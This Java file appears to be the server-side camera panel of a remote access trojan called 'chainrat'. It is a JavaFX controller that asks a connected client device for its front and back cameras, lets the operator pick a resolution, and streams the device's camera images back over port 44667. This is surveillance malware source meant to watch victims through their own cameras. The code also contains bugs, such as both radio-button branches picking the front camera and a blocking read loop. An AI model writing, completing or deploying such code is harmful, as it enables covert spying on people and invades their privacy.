package com.nefi.chainrat.server.forms;

import com.nefi.chainrat.server.CommandType;
import com.nefi.chainrat.server.Main;
import com.nefi.chainrat.server.log.Log;
import com.nefi.chainrat.server.network.IPacket;
import com.nefi.chainrat.server.network.Server;
import com.nefi.chainrat.server.network.requests.CameraRequestPacket;
import com.nefi.chainrat.server.network.response.CameraResponsePacket;
import com.nefi.chainrat.server.network.response.ImagePacket;
import com.sun.glass.ui.Size;
import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.fxml.Initializable;
import javafx.scene.Node;
import javafx.scene.control.*;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.stage.Stage;
import java.lang.management.RuntimeMXBean;
import java.net.URL;
import java.util.HashMap;
import java.util.ResourceBundle;
import java.util.concurrent.ConcurrentHashMap;

public class frmCameraManager implements Initializable {
    public TitledPane gPaneSettings;
    public RadioButton rbFront;
    public RadioButton rbBack;
    public CheckBox cbCompression;
    public ComboBox comboSize;
    public Button btnStartStream;
    public ImageView imageView;
    public TitledPane gPaneImage;
    public Button btnStopStream;
    private Log log;
    private int clientID;
    private static final int PORT = 44667;
    private Server.ClientHandler clientHandler;

    private boolean shouldRead = true;

    private CameraResponsePacket packet;
    private String cameraID;
    private Size selectedSize;
    private String frontID;
    private String backID;
    private Size[] frontSizes;
    private String[] frontSizeStrings = new String[]{};
    private Size[] backSizes;
    private String[] backSizeStrings = new String[]{};

    private ConcurrentHashMap<String, Size> stringToSizeFront = new ConcurrentHashMap<>();
    private ConcurrentHashMap<String, Size> stringToSizeBack = new ConcurrentHashMap<>();

    @Override
    public void initialize(URL location, ResourceBundle resources) {
        this.log = Main.getLog();
        this.clientHandler = Server.clientMap.get(clientID);
        log.d(this, "Started CameraManager on thread: " + Thread.currentThread().getName() + " for ID: " + clientID);
        ToggleGroup toggleGroup = new ToggleGroup();
        rbFront.setToggleGroup(toggleGroup);
        rbBack.setToggleGroup(toggleGroup);
        log.d(this, "Trying to get client for ID: " + clientID);


        CameraRequestPacket request = new CameraRequestPacket(null, null, 0);
        IPacket response = clientHandler.sendWithResponse(request, CameraRequestPacket.class);

        if(response == null){
            log.d(this, "Error getting response :(");
            return;
        }
        //Response is valid
        packet = (CameraResponsePacket) response;

        //Fill vars
        this.frontID = packet.frontID;
        this.backID = packet.backID;
        this.frontSizes = packet.frontSizes;
        this.backSizes = packet.backSizes;

        this.frontSizeStrings = new String[frontSizes.length];
        this.backSizeStrings = new String[backSizes.length];

        //Loop through frontSizes to create a size string map for front
        int i = 0;
        for(Size size : this.frontSizes){
            this.frontSizeStrings[i] = size.width + " x " + size.height;
            this.stringToSizeFront.put(this.frontSizeStrings[i], this.frontSizes[i]);
            i++;
        }
        //For Back
        i = 0;
        for(Size size : this.backSizes){
            this.backSizeStrings[i] = size.width + " x " + size.height;
            this.stringToSizeBack.put(this.backSizeStrings[i], this.backSizes[i]);
            i++;
        }

        //Check which combobox is checked and fill it
        refreshCombobox();
    }

    public void setClientID(int id){
        this.clientID = id;
    }
    public void btnStartStream_Click(ActionEvent actionEvent) {
        //Create the request
        CameraRequestPacket crp = new CameraRequestPacket(this.selectedSize, this.cameraID, PORT);
        if(clientHandler.sendWithResponse(crp, CameraRequestPacket.class) == null){
            log.d(this, "No response. Try again.");
            return;
        }

        //Hide this button and show the stop button
        btnStartStream.setVisible(false);
        btnStopStream.setVisible(true);

        //Read Pictures:
        while (shouldRead){
            readPicture();
        }
    }

    private void readPicture(){

     class OneShotTask implements Runnable {
            private Size pSize;
            private String pID;
            private int pPort;

            private OneShotTask(Size size, String ID, int port) { pSize = size; pID = ID; pPort = port; }
            public void run() {
                CameraRequestPacket crp = new CameraRequestPacket(pSize, pID, pPort);
                while(true){
                    IPacket response = clientHandler.sendWithResponse(crp, CameraRequestPacket.class);
                    if(response == null || response.type() != CommandType.IMAGE){
                        log.d(this, "Error - no response or response not an image");
                        return;
                    }

                    //Input is image
                    ImagePacket packet = (ImagePacket) response;
                    updateImage(packet.image);
                    return;
                }
            }
        }
        Thread t = new Thread(new OneShotTask(this.selectedSize, this.cameraID, this.PORT));
        t.start();
        return;
    }

    private void updateImage(Image img){
        Runnable update = new Runnable() {
            @Override
            public void run() {
                imageView.setFitHeight(img.getHeight());
                imageView.setFitWidth(img.getWidth());
                imageView.setImage(img);
            }
        };
        update.run();
    }

    public void refreshCombobox(){
        //Check which combobox is checked and fill it
        comboSize.getItems().clear();
        if(rbFront.isSelected()){
            this.cameraID = this.frontID;
            for(String s : frontSizeStrings){
                comboSize.getItems().add(s);
            }
        }else{
            this.cameraID = this.backID;
            for(String s : backSizeStrings){
                comboSize.getItems().add(s);
            }
        }
        comboSize.getSelectionModel().select(0);
        return;
    }

    public void rbChanged(ActionEvent actionEvent) {
        if(rbFront.isSelected()){
            this.cameraID = frontID;
        }else {
            this.cameraID = frontID;
        }
        refreshCombobox();
    }

    private void closeWindow(ActionEvent actionEvent){
        final Node source = (Node) actionEvent.getSource();
        final Stage stage = (Stage) source.getScene().getWindow();
        stage.close();
    }

    public void btnStopStream_Click(ActionEvent actionEvent) {
        //Send new CameraRequest
        CameraRequestPacket crp = new CameraRequestPacket(null, "STOP", 0);
        IPacket out = clientHandler.sendWithResponse(crp, CameraRequestPacket.class);
        if(out == null){
            log.d(this, "Didnt get a response, please try again.");
            closeWindow(actionEvent);
        }
        log.d(this, "Valid Response got! You can start again.");
        //Show start stream button
        btnStopStream.setVisible(false);
        btnStartStream.setVisible(true);
    }

    public void comboSize_changed(ActionEvent actionEvent) {
        if(rbFront.isSelected()){
            this.selectedSize = stringToSizeFront.get(comboSize.getSelectionModel().getSelectedItem());
        }else {
            this.selectedSize = stringToSizeBack.get(comboSize.getSelectionModel().getSelectedItem());
        }
        refreshCombobox();
    }
}
